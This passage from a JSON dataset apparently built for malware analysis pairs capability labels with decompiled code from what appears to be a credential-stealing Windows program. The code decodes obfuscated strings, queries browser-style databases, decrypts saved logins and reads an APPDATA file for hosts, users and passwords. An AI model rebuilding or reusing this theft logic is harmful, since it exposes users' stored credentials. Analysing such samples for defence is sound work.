*(&stack0x00000004 + iVar4) = uVar5;\n    *(&stack0x00000000 + iVar4) = 0x204;\n    *(&stack0xfffffffc + iVar4) = &stack0x00001058 + iVar4;\n    *(&stack0xfffffff8 + iVar4) = 0x410daa;\n    fcn.00419fa8();\n    *(&stack0xfffffffc + iVar4) = \"%6\\\\iWn4R6.e6WR\";\n    *(&stack0xfffffff8 + iVar4) = 0x410db6;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000008 + iVar4) = &stack0x0000125c + iVar4;\n    *(&stack0x00000004 + iVar4) = uVar5;\n    *(&stack0x00000000 + iVar4) = 0x204;\n    *(&stack0xfffffffc + iVar4) = &stack0x00000e54 + iVar4;\n    *(&stack0xfffffff8 + iVar4) = 0x410ddc;\n    fcn.00419fa8();\n    *(&stack0xfffffffc + iVar4) = \"LMMpXR45\";\n    *(&stack0xfffffff8 + iVar4) = 0x410de8;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410dfb;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015bc + iVar4) = uVar5;\n    if (*(&stack0x000015bc + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"9HGGpEd5XR5d0RCiHdZMiW5\";\n    *(&stack0xfffffff8 + iVar4) = 0x410e22;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410e35;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015b8 + iVar4) = uVar5;\n    if (*(&stack0x000015b8 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"9HGGpDQ5IdR54YC5d\";\n    *(&stack0xfffffff8 + iVar4) = 0x410e5c;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410e6f;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015b4 + iVar4) = uVar5;\n    if (*(&stack0x000015b4 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"9mpcC6doOadYWSd\";\n    *(&stack0xfffffff8 + iVar4) = 0x410e96;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410ea9;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015b0 + iVar4) = uVar5;\n    if (*(&stack0x000015b0 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"MjPXqjFpx80ddX5dl\";\n    *(&stack0xfffffff8 + iVar4) = 0x410ed0;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410ee3;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015ac + iVar4) = uVar5;\n    if (*(&stack0x000015ac + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"9HGGMarpadY0Zs5\";\n    *(&stack0xfffffff8 + iVar4) = 0x410f0a;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410f1d;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015a8 + iVar4) = uVar5;\n    if (*(&stack0x000015a8 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"9HGGp_0ddMiW5\";\n    *(&stack0xfffffff8 + iVar4) = 0x410f44;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410f57;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015a4 + iVar4) = uVar5;\n    if (*(&stack0x000015a4 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"LMMpMIQ5SWgR\";\n    *(&stack0xfffffff8 + iVar4) = 0x410f7e;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001568 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410f91;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x000015a0 + iVar4) = uVar5;\n    if (*(&stack0x000015a0 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"67i45dNpWsdR\";\n    *(&stack0xfffffff8 + iVar4) = 0x410fb8;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001554 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x410fcb;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x0000159c + iVar4) = uVar5;\n    if (*(&stack0x0000159c + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"67i45dNpYiW6d\";\n    *(&stack0xfffffff8 + iVar4) = 0x410ff2;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001554 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x411005;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x00001598 + iVar4) = uVar5;\n    if (*(&stack0x00001598 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"67i45dNps0dsC0dp2h\";\n    *(&stack0xfffffff8 + iVar4) = 0x41102c;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001554 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x41103f;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x00001594 + iVar4) = uVar5;\n    if (*(&stack0x00001594 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"67i45dNp65ds\";\n    *(&stack0xfffffff8 + iVar4) = 0x411066;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001554 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x411079;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x00001590 + iVar4) = uVar5;\n    if (*(&stack0x00001590 + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = \"67i45dNpYWiQlRp5df5\";\n    *(&stack0xfffffff8 + iVar4) = 0x4110a0;\n    uVar5 = fcn.0040b60e();\n    *(&stack0x00000000 + iVar4) = uVar5;\n    *(&stack0xfffffffc + iVar4) = *(&stack0x00001554 + iVar4);\n    *(&stack0xfffffff8 + iVar4) = 0x4110b3;\n    uVar5 = fcn.0040b4ff();\n    *(&stack0x0000158c + iVar4) = uVar5;\n    if (*(&stack0x0000158c + iVar4) == 0) {\n        return 0;\n    }\n    *(&stack0xfffffffc + iVar4) = &stack0x00001058 + iVar4;\n    *(&stack0xfffffff8 + iVar4) = 0x4110dd;\n    cVar3 = fcn.0040aa34();\n    if (cVar3 != '\\0') {\n        *(&stack0x00000000 + iVar4) = &stack0x00000038 + iVar4;\n        *(&stack0xfffffffc + iVar4) = &stack0x00001058 + iVar4;\n        ppcVar11 = &stack0xfffffff8 + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 0x411100;\n        iVar7 = (**(&stack0x0000159c + iVar4))();\n        if (iVar7 != 0) {\n            return 0;\n        }\n        *ppcVar11 = \"6didY5 *  80Wl lWkpiWn4R6\";\n        ppcVar11[-1] = 0x41111a;\n        uVar5 = fcn.0040b60e();\n        *ppcVar11 = uVar5;\n        ppcVar11[-1] = 0x411122;\n        pcVar8 = sub.msvcrt.dll_strlen();\n        *ppcVar11 = \"6didY5 *  80Wl lWkpiWn4R6\";\n        ppcVar11[-1] = 0x411130;\n        pcVar9 = fcn.0040b60e();\n        ppcVar11[4] = ppcVar11 + 0xd;\n        ppcVar11[3] = ppcVar11 + 0xe;\n        ppcVar11[2] = pcVar8;\n        ppcVar11[1] = pcVar9;\n        *ppcVar11 = ppcVar11[0xf];\n        ppcVar12 = ppcVar11 + -1;\n        ppcVar11[-1] = 0x411158;\n        iVar7 = (*ppcVar11[0x566])();\n        if (iVar7 == 0) {\n            *ppcVar12 = ppcVar12 + 0x498;\n            ppcVar1 = ppcVar12 + 0x570;\n            puVar13 = ppcVar12 + -1;\n            ppcVar12 = ppcVar12 + -1;\n            *puVar13 = 0x411173;\n            iVar7 = (**ppcVar1)();\n            if (iVar7 == 0) {\n                puVar14 = ppcVar12 + -4;\n                *(ppcVar12 + -4) = 0x411184;\n                uVar5 = (**(ppcVar12 + 0x15bc))();\n                puVar14[0x563] = uVar5;\n                if (puVar14[0x563] != 0) {\n                    puVar14[2] = 0;\n                    puVar14[1] = 1;\n                    *puVar14 = puVar14[0x563];\n                    puVar15 = puVar14 + -1;\n                    puVar14[-1] = 0x4111bc;\n                    iVar7 = (*puVar14[0x56e])();\n                    if (iVar7 == 0) {\n                        *(puVar15 + 0x15cc) = 0;\n                        *(puVar15 + 0x1588) = 0;\n                        do {\n                            puVar15[1] = 1;\n                            *puVar15 = puVar15[0xe];\n                            ppiVar16 = puVar15 + -1;\n                            puVar15[-1] = 0x4111f2;\n                            uVar5 = (*puVar15[0x564])();\n                            ppiVar16[0x561] = uVar5;\n                            if (ppiVar16[0x561] != NULL) {\n                                ppiVar16[1] = 0x6;\n                                *ppiVar16 = ppiVar16[0xe];\n                                puVar17 = ppiVar16 + -1;\n                                ppiVar16[-1] = 0x41121f;\n                                uVar5 = (*ppiVar16[0x564])();\n                                puVar17[2] = 0x200;\n                                puVar17[1] = uVar5;\n                                *puVar17 = puVar17 + 0x96;\n                                puVar17[-1] = 0x41123a;\n                                fcn.00419918();\n                                puVar17[0x11] = 0;\n                                puVar17[0x12] = 0;\n                                *puVar17 = puVar17 + 0x96;\n                                puVar17[-1] = 0x411259;\n                                uVar5 = sub.msvcrt.dll_strlen();\n                                puVar17[2] = puVar17 + 0x196;\n                                puVar17[1] = uVar5;\n                                *puVar17 = puVar17 + 0x96;\n                                ppiVar16 = puVar17 + -1;\n                                puVar17[-1] = 0x41127b;\n                                iVar7 = (*puVar17[0x56d])();\n                                if (iVar7 != 0) {\n                                    ppiVar16[0x14] = ppiVar16 + 0x196;\n                                    *ppiVar16 = ppiVar16 + 0x96;\n                                    ppiVar16[-1] = 0x41129d;\n                                    piVar10 = fcn.00405ca7();\n                                    ppiVar16[0x15] = piVar10;\n                                    ppiVar16[2] = NULL;\n                                    ppiVar16[1] = ppiVar16 + 0x10;\n                                    *ppiVar16 = ppiVar16 + 0x13;\n                                    ppiVar2 = ppiVar16 + 0x56b;\n                                    ppiVar18 = ppiVar16 + -1;\n                                    ppiVar16 = ppiVar16 + -1;\n                                    *ppiVar18 = 0x4112c1;\n                                    iVar7 = (**ppiVar2)();\n                                    if ((iVar7 == 0) && (ppiVar16[0x15] != NULL)) {\n                                        ppiVar16[2] = ppiVar16[0x12] + 1;\n                                        ppiVar16[1] = ppiVar16[0x11];\n                                        *ppiVar16 = ppiVar16 + 0x96;\n                                        ppiVar16[-1] = 0x4112f7;\n                                        fcn.00419918();\n                                        ppiVar16[1] = 0x7;\n                                        *ppiVar16 = ppiVar16[0xe];\n                                        puVar19 = ppiVar16 + -1;\n                                        ppiVar16[-1] = 0x41130f;\n                                        uVar5 = (*ppiVar16[0x564])();\n                                        puVar19[2] = 0x200;\n                                        puVar19[1] = uVar5;\n                                        *puVar19 = puVar19 + 0x16;\n                                        puVar19[-1] = 0x411327;\n                                        fcn.00419918();\n                                        puVar19[0x11] = 0;\n                                        puVar19[0x12] = 0;\n                                        *puVar19 = puVar19 + 0x16;\n                                        puVar19[-1] = 0x411343;\n                                        uVar5 = sub.msvcrt.dll_strlen();\n                                        puVar19[2] = puVar19 + 0x196;\n                                        puVar19[1] = uVar5;\n                                        *puVar19 = puVar19 + 0x16;\n                                        puVar20 = puVar19 + -1;\n                                        puVar19[-1] = 0x411362;\n                                        (*puVar19[0x56d])();\n                                        puVar20[0x14] = puVar20 + 0x196;\n                                        *puVar20 = puVar20 + 0x16;\n                                        puVar20[-1] = 0x411379;\n                                        uVar5 = fcn.00405ca7();\n                                        puVar20[0x15] = uVar5;\n                                        puVar20[2] = 0;\n                                        puVar20[1] = puVar20 + 0x10;\n                                        *puVar20 = puVar20 + 0x13;\n                                        ppiVar16 = puVar20 + -1;\n                                        puVar20[-1] = 0x41139d;\n                                        iVar7 = (*puVar20[0x56b])();\n                                        if ((iVar7 == 0) && ((ppiVar16[0x15] != NULL && (ppiVar16[0x12] < 0x200)))) {\n                                            ppiVar16[2] = ppiVar16[0x12] + 1;\n                                            ppiVar16[1] = ppiVar16[0x11];\n                                            *ppiVar16 = ppiVar16 + 0x16;\n                                            ppiVar16[-1] = 0x4113df;\n                                            fcn.00419918();\n                                            ppiVar16[5] = ppiVar16 + 0x16;\n                                            ppiVar16[4] = ppiVar16 + 0x96;\n                                            ppiVar16[3] = ppiVar16[0x561];\n                                            ppiVar16[2] = ppiVar16[0x578];\n                                            ppiVar16[1] = \"%c%s\\a%s\\a%s\\b\\b\\b\\b\";\n                                            *ppiVar16 = ppiVar16 + 0xc;\n                                            ppiVar16[-1] = 0x41141c;\n                                            uVar5 = fcn.00419f10();\n                                            ppiVar16[0x562] = uVar5;\n                                            if (ppiVar16[0x562] != 0xffffffff) {\n                                                ppiVar16[4] = 0x1;\n                                                ppiVar16[3] = ppiVar16[0x562];\n                                                ppiVar16[2] = ppiVar16 + 0xc;\n                                                ppiVar16[1] = ppiVar16[0x573];\n                                                *ppiVar16 = ppiVar16 + 0xb;\n                                                ppiVar16[-1] = 0x41145f;\n                                                uVar5 = fcn.0041a022();\n                                                ppiVar16[0xb] = uVar5;\n                                                ppiVar16[0x573] = ppiVar16[0x573] + ppiVar16[0x562];\n                                            }\n                                            ppiVar16[1] = NULL;\n                                            *ppiVar16 = ppiVar16 + 0x10;\n                                            ppcVar1 = ppiVar16 + 0x56c;\n                                            puVar21 = ppiVar16 + -1;\n                                            ppiVar16 = ppiVar16 + -1;\n                                            *puVar21 = 0x411489;\n                                            (**ppcVar1)();\n                                        }\n                                    }\n                                }\n                            }\n                            *ppiVar16 = ppiVar16[0xe];\n                            puVar15 = ppiVar16 + -1;\n                            ppiVar16[-1] = 0x4114a2;\n                            iVar7 = (*ppiVar16[0x565])();\n                        } while (iVar7 == 100);\n                    }\n                    *puVar15 = puVar15[0x563];\n                    puVar14 = puVar15 + -1;\n                    puVar15[-1] = 0x4114be;\n                    (*puVar15[0x56a])();\n                }\n                ppcVar12 = puVar14 + -4;\n                *(puVar14 + -4) = 0x4114c7;\n                (**(puVar14 + 0x15a4))();\n            }\n        }\n    }\n    *ppcVar12 = ppcVar12 + 0x396;\n    ppcVar12[-1] = 0x4114d6;\n    cVar3 = fcn.0040aa34();\n    puVar29 = ppcVar12;\n    if (cVar3 != '\\0') {\n        ppcVar12[1] = 0x41fbc7;\n        *ppcVar12 = ppcVar12 + 0x396;\n        ppcVar12[-1] = 0x4114f5;\n        uVar5 = sub.msvcrt.dll_fopen();\n        ppcVar12[0x560] = uVar5;\n        if (ppcVar12[0x560] != NULL) {\n            *ppcVar12 = ppcVar12 + 0x396;\n            ppcVar12[-1] = 0x411519;\n            uVar5 = fcn.0040ac70();\n            ppcVar12[0x55f] = uVar5;\n            *ppcVar12 = ppcVar12[0x55f];\n            ppcVar12[-1] = 0x41152f;\n            uVar5 = sub.msvcrt.dll_malloc();\n            ppcVar12[10] = uVar5;\n            if (ppcVar12[10] == NULL) {\n                *ppcVar12 = ppcVar12[0x560];\n                ppcVar12[-1] = 0x41154a;\n                sub.msvcrt.dll_fclose();\n            }\n            else {\n                ppcVar12[3] = ppcVar12[0x560];\n                ppcVar12[2] = ppcVar12[0x55f];\n                ppcVar12[1] = 0x1;\n                *ppcVar12 = ppcVar12[10];\n                ppcVar12[-1] = 0x411579;\n                sub.msvcrt.dll_fread();\n                *ppcVar12 = ppcVar12[0x560];\n                ppcVar12[-1] = 0x411588;\n                sub.msvcrt.dll_fclose();\n                *ppcVar12 = ppcVar12 + 0x498;\n                puVar22 = ppcVar12 + -1;\n                ppcVar12[-1] = 0x41159b;\n                iVar7 = (*ppcVar12[0x570])();\n                if (iVar7 == 0) {\n                    puVar23 = puVar22 + -4;\n                    *(puVar22 + -4) = 0x4115ac;\n                    uVar5 = (**(puVar22 + 0x15bc))();\n                    puVar23[0x563] = uVar5;\n                    if (puVar23[0x563] != 0) {\n                        puVar23[2] = 0;\n                        puVar23[1] = 1;\n                        *puVar23 = puVar23[0x563];\n                        ppcVar24 = puVar23 + -1;\n                        puVar23[-1] = 0x4115e4;\n                        iVar7 = (*puVar23[0x56e])();\n                        if (iVar7 == 0) {\n                            *(ppcVar24 + 0x15c8) = 0;\n                            *(ppcVar24 + 0x1578) = 0;\n                            *(ppcVar24 + 0x15c4) = 0;\n                            while( true ) {\n                                pcVar8 = ppcVar24[10];\n                                *ppcVar24 = \"IW65RCld\";\n                                ppcVar24[-1] = 0x411910;\n                                pcVar9 = fcn.0040b60e();\n                                ppcVar24[2] = pcVar8;\n                                ppcVar24[1] = pcVar9;\n                                *ppcVar24 = ppcVar24[0x571] + 1;\n                                ppcVar24[-1] = 0x41192a;\n                                pcVar8 = fcn.00419b7e();\n                                ppcVar24[0x571] = pcVar8;\n                                if (ppcVar24[0x571] == 0xffffffff) break;\n                                *ppcVar24 = \"IW65RCld\";\n                                ppcVar24[-1] = 0x41161e;\n                                pcVar8 = fcn.0040b60e();\n                                ppcVar24[4] = 0x200;\n                                ppcVar24[3] = ppcVar24 + 0x116;\n                                ppcVar24[2] = pcVar8;\n                                ppcVar24[1] = ppcVar24[0x571];\n                                *ppcVar24 = ppcVar24[10];\n                                ppcVar24[-1] = 0x41164c;\n                                cVar3 = fcn.004109b4();\n                                if (cVar3 != '\\x01') break;\n                                *ppcVar24 = \"dRY0Zs5dSu6d0RCld\";\n                                ppcVar24[-1] = 0x411663;\n                                pcVar8 = fcn.0040b60e();\n                                ppcVar24[4] = 0x200;\n                                ppcVar24[3] = ppcVar24 + 0x96;\n                                ppcVar24[2] = pcVar8;\n                                ppcVar24[1] = ppcVar24[0x571];\n                                *ppcVar24 = ppcVar24[10];\n                                ppcVar24[-1] = 0x411691;\n                                cVar3 = fcn.004109b4();\n                                if (cVar3 != '\\x01') break;\n                                *ppcVar24 = \"dRY0Zs5dS9C66gW0S\";\n                                ppcVar24[-1] = 0x4116a8;\n                                pcVar8 = fcn.0040b60e();\n                                ppcVar24[4] = 0x200;\n                                ppcVar24[3] = ppcVar24 + 0x16;\n                                ppcVar24[2] = pcVar8;\n                                ppcVar24[1] = ppcVar24[0x571];\n                                *ppcVar24 = ppcVar24[10];\n                                ppcVar24[-1] = 0x4116d3;\n                                cVar3 = fcn.004109b4();\n                                if (cVar3 != '\\x01') break;\n                                ppcVar24[0x11] = NULL;\n                                ppcVar24[0x12] = NULL;\n                                *ppcVar24 = ppcVar24 + 0x96;\n                                ppcVar24[-1] = 0x4116fd;\n                                pcVar8 = sub.msvcrt.dll_strlen();\n                                ppcVar24[2] = ppcVar24 + 0x196;\n                                ppcVar24[1] = pcVar8;\n                                *ppcVar24 = ppcVar24 + 0x96;\n                                ppcVar1 = ppcVar24 + 0x56d;\n                                ppcVar25 = ppcVar24 + -1;\n                                ppcVar24 = ppcVar24 + -1;\n                                *ppcVar25 = 0x41171f;\n                                iVar7 = (**ppcVar1)();\n                                if (iVar7 != 0) {\n                                    ppcVar24[0x14] = ppcVar24 + 0x196;\n                                    *ppcVar24 = ppcVar24 + 0x96;\n                                    ppcVar24[-1] = 0x411742;\n                                    uVar5 = fcn.00405ca7();\n                                    ppcVar24[0x15] = uVar5;\n                                    ppcVar24[2] = NULL;\n                                    ppcVar24[1] = ppcVar24 + 0x10;\n                                    *ppcVar24 = ppcVar24 + 0x13;\n                                    ppcVar1 = ppcVar24 + 0x56b;\n                                    puVar26 = ppcVar24 + -1;\n                                    ppcVar24 = ppcVar24 + -1;\n                                    *puVar26 = 0x411766;\n                                    iVar7 = (**ppcVar1)();\n                                    if ((iVar7 == 0) && (ppcVar24[0x15] != NULL)) {\n                                        ppcVar24[2] = ppcVar24[0x12] + 1;\n                                        ppcVar24[1] = ppcVar24[0x11];\n                                        *ppcVar24 = ppcVar24 + 0x96;\n                                        ppcVar24[-1] = 0x41179d;\n                                        fcn.00419918();\n                                        ppcVar24[0x11] = NULL;\n                                        ppcVar24[0x12] = NULL;\n                                        *ppcVar24 = ppcVar24 + 0x16;\n                                        ppcVar24[-1] = 0x4117b9;\n                                        uVar5 = sub.msvcrt.dll_strlen();\n                                        ppcVar24[2] = ppcVar24 + 0x196;\n                                        ppcVar24[1] = uVar5;\n                                        *ppcVar24 = ppcVar24 + 0x16;\n                                        puVar27 = ppcVar24 + -1;\n                                        ppcVar24[-1] = 0x4117d8;\n                                        (*ppcVar24[0x56d])();\n                                        puVar27[0x14] = puVar27 + 0x196;\n                                        *puVar27 = puVar27 + 0x16;\n                                        puVar27[-1] = 0x4117ef;\n                                        uVar5 = fcn.00405ca7();\n                                        puVar27[0x15] = uVar5;\n                                        puVar27[2] = 0;\n                                        puVar27[1] = puVar27 + 0x10;\n                                        *puVar27 = puVar27 + 0x13;\n                                        ppcVar24 = puVar27 + -1;\n                                        puVar27[-1] = 0x411813;\n                                        iVar7 = (*puVar27[0x56b])();\n                                        if ((iVar7 == 0) && ((ppcVar24[0x15] != NULL && (ppcVar24[0x12] < 0x200)))) {\n                                            ppcVar24[2] = ppcVar24[0x12] + 1;\n                                            ppcVar24[1] = ppcVar24[0x11];\n                                            *ppcVar24 = ppcVar24 + 0x16;\n                                            ppcVar24[-1] = 0x411856;\n                                            fcn.00419918();\n                                            ppcVar24[5] = ppcVar24 + 0x16;\n                                            ppcVar24[4] = ppcVar24 + 0x96;\n                                            ppcVar24[3] = ppcVar24 + 0x116;\n                                            ppcVar24[2] = ppcVar24[0x578];\n                                            ppcVar24[1] = \"%c%s\\a%s\\a%s\\b\\b\\b\\b\";\n                                            *ppcVar24 = ppcVar24 + 0xc;\n                                            ppcVar24[-1] = 0x411893;\n                                            uVar5 = fcn.00419f10();\n                                            ppcVar24[0x55e] = uVar5;\n                                            if (ppcVar24[0x55e] != 0xffffffff) {\n                                                ppcVar24[4] = 0x1;\n                                                ppcVar24[3] = ppcVar24[0x55e];\n                                                ppcVar24[2] = ppcVar24 + 0xc;\n                                                ppcVar24[1] = ppcVar24[0x572];\n                                                *ppcVar24 = ppcVar24 + 0xb;\n                                                ppcVar24[-1] = 0x4118d6;\n                                                uVar5 = fcn.0041a022();\n                                                ppcVar24[0xb] = uVar5;\n                                                ppcVar24[0x572] = ppcVar24[0x572] + ppcVar24[0x55e];\n                                            }\n                                            ppcVar24[1] = NULL;\n                                            *ppcVar24 = ppcVar24 + 0x10;\n                                            ppcVar1 = ppcVar24 + 0x56c;\n                                            puVar28 = ppcVar24 + -1;\n                                            ppcVar24 = ppcVar24 + -1;\n                                            *puVar28 = 0x411900;\n                                            (**ppcVar1)();\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                        *ppcVar24 = ppcVar24[0x563];\n                        puVar23 = ppcVar24 + -1;\n                        ppcVar24[-1] = 0x41195b;\n                        (*ppcVar24[0x56a])();\n                    }\n                    puVar22 = puVar23 + -4;\n                    *(puVar23 + -4) = 0x411964;\n                    (**(puVar23 + 0x15a4))();\n                }\n                *puVar22 = puVar22 + 10;\n                puVar22[-1] = 0x411970;\n                fcn.0040b4bf();\n                puVar29 = puVar22;\n            }\n        }\n    }\ncode_r0x0041197c:\n    puVar29[1] = puVar29 + 0x529;\n    *puVar29 = puVar29 + 0x555;\n    puVar29[-1] = 0x411996;\n    fcn.004105f4();\n    return puVar29[0xb];\n}\n",
        "token_count": 10948
    },
    "00411b6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00411b6c(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iStack796;\n    uint uStack792;\n    uchar auStack787 [516];\n    uchar auStack271 [255];\n    int32_t iStack16;\n    \n    uStack792 = 0;\n    uVar1 = sub.msvcrt.dll_getenv(\"APPDATA\");\n    uVar2 = fcn.0040b60e(\"%6\\\\.sQ0sid\\\\CYYWQR56.fli\");\n    fcn.00419fa8(auStack787, 0x204, uVar2, uVar1);\n    iStack16 = sub.msvcrt.dll_fopen(auStack787, 0x41f93e);\n    if (iStack16 != 0) {\n        iStack796 = 0;\n        while (iVar3 = sub.msvcrt.dll_fgets(auStack271, 0xff, iStack16),  iVar3 != 0) {\n            iStack796 = 0;\n            uVar1 = fcn.0040b60e(\"<s0W5WYWi>\");\n            iVar3 = fcn.00419b7e(0, uVar1, auStack271);\n            if (iVar3 == -1) {\n                uVar1 = fcn.0040b60e(\"<RCld>\");\n                iVar3 = fcn.00419b7e(0, uVar1, auStack271);\n                if (iVar3 == -1) {\n                    uVar1 = fcn.0040b60e(\"<sC66gW0S>\");\n                    iVar3 = fcn.00419b7e(0, uVar1, auStack271);\n                    if (iVar3 == -1) goto code_r0x00411cd8;\n                }\n                iVar3 = fcn.00419f10(&iStack796, 0x41fc70, auStack271);\n                if (iVar3 == -1) {\n                    return 0;\n                }\n            }\n            else {\n                iVar3 = fcn.00419f10(&iStack796, \"%d%s\\a\", 2, auStack271);\n                if (iVar3 == -1) {\n                    return 0;\n                }\n            }\ncode_r0x00411cd8:\n            if (iStack796 != 0) {\n                uStack792 = fcn.0041a022(&uStack792, 0xffffffff, &iStack796, 0xffffffff, 1);\n            }\n        }\n        sub.msvcrt.dll_fclose(iStack16);\n    }\n    return uStack792;\n}\n",
        "token_count": 581
    },
    "00411da2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00411da2(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    code *pcStack36;\n    code *pcStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    uint32_t uStack16;\n    \n    iStack44 = 0;\n    iStack28 = 0;\n    uStack48 = 0;\n    uStack16 = 0;\n    pcStack32 = NULL;\n    pcStack36 = NULL;\n    uStack52 = 0;\n    uStack56 = 0;\n    uVar1 = fcn.0040b60e(0x41fc74);\n    iStack28 = fcn.0040b4e9(uVar1);\n    if (iStack28 != 0) {\n        uVar1 = fcn.0040b60e(\"P0dSjRQld0C5dD\");\n        pcStack32 = fcn.0040b4ff(iStack28, uVar1);\n        if (pcStack32 != NULL) {\n            uVar1 = fcn.0040b60e(\"P0dS_0dd\");\n            pcStack36 = fcn.0040b4ff(iStack28, uVar1);\n            if (pcStack36 != NULL) {\n                uVar1 = fcn.0040b60e(\"U4RSWg6m42d:RCld=*\");\n                iVar2 = (*pcStack32)(uVar1, 0, &uStack48, &iStack44);\n                if (iVar2 != 0) {\n                    iStack20 = 0;\n                    iStack40 = 0;\n                    for (uStack16 = 0; uStack16 < uStack48; uStack16 = uStack16 + 1) {\n                        iStack24 = *(*(iStack44 + uStack16 * 4) + 0x1c);\n                        if (iStack24 == 0) {\n                            iStack24 = 0x41fcac;\n                        }\n                        iStack40 = fcn.00419f10(&uStack52, \"%d%s\\a%ws\\a\", 1, *(*(iStack44 + uStack16 * 4) + 0x30), \n                                                iStack24);\n                        if (iStack40 != -1) {\n                            uStack56 = fcn.0041a022(&uStack56, iStack20, &uStack52, iStack40, 1);\n                            iStack20 = iStack20 + iStack40;\n                        }\n                    }\n                    (*pcStack36)(iStack44);\n                }\n            }\n        }\n    }\n    fcn.0040b51d(iStack28);\n    return uStack56;\n}\n",
        "token_count": 643
    },
    "00411f98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
